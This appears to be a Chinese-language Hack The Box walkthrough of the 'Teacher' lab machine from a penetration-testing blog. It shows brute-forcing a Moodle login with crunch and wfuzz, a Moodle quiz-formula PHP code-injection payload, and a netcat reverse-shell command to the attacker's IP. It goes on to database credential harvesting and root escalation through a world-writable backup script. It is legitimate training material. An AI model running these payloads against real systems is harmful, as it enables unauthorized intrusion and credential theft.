@@ -1,0 +1,227 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/W4nHWlfxHR47gLFYzayhQg)
+
+一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)
+
+  
+
+  
+
+大家好，这里是 **大余安全** 的第 **144** 篇文章，本公众号会每日分享攻防渗透技术给大家。
+
+  
+
+  
+
+  
+
+靶机地址：https://www.hackthebox.eu/home/machines/profile/165
+
+靶机难度：中级（5.0/10）
+
+靶机发布日期：2019 年 4 月 21 日
+
+靶机描述：
+
+Teacher is a "medium" difficulty machine, which teaches techniques for identifying and exploiting logical flaws and vulnerabilities of outdated modules within popular CMS (in this instance Moodle), enumeration of sensitive information within the backend database and leverage misconfigurations on the operating system, which lead to a complete compromise of a system.
+
+请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/aUOT8MibumibTezJtREQ7iabtA23O9WAFku4Bian1vXLOpxwIk705rqQvxdoBr6uT5hxFc9wq6XibJS5FjKdbsBC1dg/640?wx_fmt=png)
+
+一、信息收集
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1uCUMQNqoTR023MgBQF6euL3oTLJDQNxbQslmIpf3j0pILibl0spZ8cibg/640?wx_fmt=png)
+
+可以看到靶机的 IP 是 10.10.10.153...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1uEcUbfZZ0zMKrLDpdlruYP5BNvTDpDtvT04Lj2R6hDpK9p5xrLDjsZA/640?wx_fmt=png)
+
+nmap 仅发现开放了 80 端口...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1ufyDZ0EmuiahdSsVS3cTb151OgaWibkHYlPEE2jsemiaSxmJKIaYu8BGzw/640?wx_fmt=png)
+
+进入了 Blackhat highschool 页面...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1ukM0xdtvylnxRBZCibOxTQqsJ67VbibzeIP3TN8abibz8dZmicHCrIBXlAQ/640?wx_fmt=png)
+
+检查 Gallery 模块发现了一些老师的人脸图片...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1uwgvaoTKDYkNAAjE2icxnacVDv4vkL12J4EotQ4IQenHnZxnOiaMs9rQA/640?wx_fmt=png)
+
+检查前端源码，发现了 5.png 的属性为 That's an F... 下载下来看看
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1uHzmLCKN7dzIOnaVibsdO9y6UQvo2UFj6p87ayyK9Wl1IdY7CU2TFpSw/640?wx_fmt=png)
+
+下载后，发现了这是一段话，这里获得了用户名和密码提示... 说 Th4C00lTheacha 密码缺少最后一位字符...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1uVGvUrMfib0vn2CnYuGWtTSSm2M2mvSbrkEDTYgVrJ7MHQLU41YiczX5Q/640?wx_fmt=png)
+
+```
+sudo crunch 15 15 -t Th4C00lTheacha^ -o passwd.txt
+```
+
+利用 crunch 来组合最后一个字符的字典文本...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1uTz5jxyF6zppADN2FvpTVsa45fV4l5jdXQNw6dT5iccNX8Ab9iaEicm8nQ/640?wx_fmt=png)
+
+有了用户名和密码本，需要找到登陆用户页面...
+
+在爆破目录中发现了 moddle 页面...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1u351HAXQNHp3INafm0Sq0TicIWIMCYq2zQHkT2Xaq3ibwjG6HgGfcBbhQ/640?wx_fmt=png)
+
+该页面正好是我需要的登陆页面... 开始爆破密码即可
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1uS2QKc3zbQB9EfeB2wBqsAlnX75gKIuqIFpwrkNMzmcqgjBCh10sCnA/640?wx_fmt=png)
+
+```
+wfuzz -c -u http://10.10.10.153/moodle/login/index.php -d 'username=Giovanni&password=FUZZ' -w passwd.txt --hh 440
+```
+
+利用 hadry 或者 Wfuzz 模糊查找正确密码即可... 获得了正确的密码
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1ubhWL80icWXf9B2ZgEaFj3IZ6HknrXlicbNx10QQEibvpUic52hpvibWOdLQ/640?wx_fmt=png)
+
+成功登陆.. 处于 Giovanni 权限管理页面中，这是 moodle 的框架页面...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1u48icwcricb5FS4CcibIRCre9ibXEIBNruDMgIS3y1hc7yZeQDibo1xNKmlw/640?wx_fmt=png)
+
+```
+https://blog.ripstech.com/2018/moodle-remote-code-execution/
+```
+
+google 搜索了 moodle exploit 发现了一些漏洞和利用文章... 这里提示了如何提权...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1uSY2oKoOktSXn4m0Os6yTS4qbDuownnV2eVknT0C7vMWToXqZlRNgKQ/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1ug5baFt9kEqkoUiaFvkY2Ds8KTdjQ3LaAdSM7qEaoYF6GzA9yY1KtZLw/640?wx_fmt=png)
+
+打开编辑...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1u1JgSuPib6ndAeZrEf7YHwTmZiaWEsOFniapeuMTKe9ztbsvxpOlSkUvFQ/640?wx_fmt=png)
+
+创建课程...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1u6gAhiagowWibLGvtbticBic4eu14icfDslqaXLfyBVqb4jaHYAZlAgHbicRw/640?wx_fmt=png)
+
+填写课程信息...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1uZoAfKfWk9datleEZPliaDUlJLRyq213FYRQKB55XywepBRITkukrxcg/640?wx_fmt=png)
+
+保存...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1uWcQjFIeoIMPrdfLXXzJnoj3nI8qD85yjoLHgml8RcA5X1xt5ZvibdyA/640?wx_fmt=png)
+
+点击 edit quiz...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1uBianGicKT7BoXpA11BkRwic1icDBr69NYjJz9RoF9Gf7wBBmF2nxUK0aKA/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1ugKRDZCx2BUjVpmwKHD7Mo6FPfTcEmsDJv8UWqSvxEnNWlxh1LqVU3A/640?wx_fmt=png)
+
+选择问题类型 Calculated...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1uMicjf05mV2QOe3uWC3PCMYHHglqwZRHBia0e5knaMhAE4RUKnmy3a7FQ/640?wx_fmt=png)
+
+继续补充信息...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1uwiblX82fSXrqus7hetw8UNJibfic5FIUzy0LkAibzvX4Ou0jGZelibQic8xQ/640?wx_fmt=png)
+
+这里填写的是答案的公式... 根据前面文章的提示，填写
+
+```
+`/*{x}{a*/`$_GET[0]`/*(1)//}{a*/`$_GET[0]`/*({x})//}*/`
+```
+
+意思是通过代码将 url 的参数传递出系统命令为 0，然后可以写入任意的 shell...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1uW4cicSKTYFeRapiaia16sr3obQJUoicicI7hvUnbTbPGMiaic4zqbssdyELOA/640?wx_fmt=png)
+
+点击 Next Page 进入易受攻击的页面...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1ubhX6TmMvibf3VSCfPP63RsmXib4VKXw4pZuibKUO5YY2aLfAxPh1iaPjOA/640?wx_fmt=png)
+
+```
+&0=(nc -e /bin/sh 10.10.14.51 6666)
+```
+
+写入简单 shell 即可...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1umtxS1GMqvBDTAibiamhYsa8CzEcO0Jtia2u8BclhZ3yXvnlPp8SSNkWDg/640?wx_fmt=png)
+
+开启监听，获得了反向外壳...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1uJcGWiaZib4x07mhibcA4gHJI50YcAsDKKgY1Rb93jCCyIGeT1C3PmHryQ/640?wx_fmt=png)
+
+枚举了一会，发现了数据库的用户名和密码...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1u4esopX4ggz6uWVkgia7gZYZOKA4FreYxSe9jZsVzUBzPfaXFGRIDZ1Q/640?wx_fmt=png)
+
+登陆数据库，查找 moodle 库的信息，看能找到对应的用户名和密码吗...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1uppsUAtdhY9CLly0MafN1ZGINMaib5JsheeiaLEC08HFibwgF24RD0fhKg/640?wx_fmt=png)
+
+找到了四个用户名和密码...
+
+前三个密码都无法破解...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1u63c0OwnbBZWJLWY3ygwU6Htus0XJ4ricO2rg60rzddB01uiakOwukNsA/640?wx_fmt=png)
+
+giovanni 的密码为 md5 值... 获得了 expelled 密码信息...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1uxjo2Eq32hqtt2knXmyXadqMHrrlCa5Mj2Nr4f1FLOlElPh4Sv9yo7Q/640?wx_fmt=png)
+
+su 获得了 giovanni 权限外壳... 读取到了 user_flag 信息...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1uibXib8KiaeGdsnpbhftFOloXNKhibtiaFlvmnPG6pnr1apBoMzrnetibVoqA/640?wx_fmt=png)
+
+上传了 LinEnum 枚举靶机，没发现可利用的地方...
+
+查看进程发现，backup.sh 脚本以 root 权限执行...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1uBReAeb8pvr4N7VDySol2Yeehgzof9uBE2wAjtG7mnZ7A7hIM1HHUkg/640?wx_fmt=png)
+
+这里最主要的是，脚本 backup 可更改当前目录... 然后赋予 777 权限...
+
+意思是用户以 root 权限为标准，可以读取，写入和执行任何文件到 / home/giovanni/work/tmp 中...
+
+那这里思路挺多的，快速获得 flag，只需要把 root 目录赋予到 tmp 即可查看..
+
+想要获取 root 权限，只需要将 / etc 的 passwd 的密码值赋予权限，并修改就能获得权限...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPm0PDgCxtYdCoDxr6Xwn1u9f2Gd2uKmWrS7MVDLUAhhbdGgkTHmoj5Sy2LSq8UmtrkwBd9DXy2dg/640?wx_fmt=png)
+
+最近快速过靶机，直接获 root_flag 信息...
+
+  
+
+  
+
+  
+
+我反思了下，最近的文章都是一句话解答，很简单的就带过了一些技术和工具，没有去过多的解释，甚至有些命令也没有写到文章中，但是在图片中都会显示出来... 因为感觉变简单了，没耐心详细解答了，希望小伙伴看到后面的文章，能耐心的 google 或者百度不会的工具或者技术问题，实在解答不了的，直接加本人微信，有问必答... 加油
+
+由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台中级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。
+
+如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/aUOT8MibumibTezJtREQ7iabtA23O9WAFku4Bian1vXLOpxwIk705rqQvxdoBr6uT5hxFc9wq6XibJS5FjKdbsBC1dg/640?wx_fmt=png)
+
+如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~
+
+![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)
+
+随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**
+
+欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！
+
+![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  
+
+大余安全
+
+一个全栈渗透小技巧的公众号
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)
